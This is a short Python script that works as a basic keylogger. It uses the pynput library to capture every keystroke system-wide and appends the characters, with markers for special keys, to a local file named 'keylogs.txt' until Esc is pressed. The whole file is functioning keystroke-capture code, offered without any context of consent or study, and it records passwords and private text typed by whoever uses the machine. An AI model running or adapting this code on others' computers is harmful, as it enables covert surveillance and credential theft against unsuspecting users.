# need the pynput library to capture keyboard events
from pynput import keyboard

# The file where the key logs will be saved
log_file = "keylogs.txt"

def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop listener
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
